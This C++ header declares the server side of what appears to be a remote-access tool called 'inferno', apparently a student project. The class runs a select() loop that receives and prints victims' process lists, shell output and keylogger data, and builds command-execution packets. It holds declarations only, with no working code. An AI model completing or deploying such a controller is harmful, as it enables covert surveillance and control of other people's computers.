#pragma once

#include "../../common/include/Socket.hpp"
#include <vector>
#include <cstdint>

namespace inferno {

class Server {
public:
    struct ClientContext {
        Socket socket;
        std::vector<uint8_t> buffer;
    };

    // Coplien
    Server();
    explicit Server(uint16_t port);
    ~Server();
    Server(const Server&)            = delete;
    Server& operator=(const Server&) = delete;

    // Static Protocol Helper (Option B - Testable)
    static void processPacketBuffer(ClientContext& client);

    // Core
    bool start();  // bind + listen
    void run();    // select() loop
    void stop();

    // Getters
    [[nodiscard]] bool     isRunning() const;
    [[nodiscard]] uint16_t getPort()   const;

private:
    Socket                     m_listen_socket; 
    std::vector<ClientContext> m_clients;       
    uint16_t                   m_port;
    bool                       m_running;

    static void printProcessList(const std::string& ip, const std::string& payload);
    static void printShellOutput(const std::string& ip, const std::string& payload);
    static void printKeylogData(const std::string& ip, const std::string& payload);
    static std::string buildCmdExecPacket(const std::string& command);
};

} // namespace inferno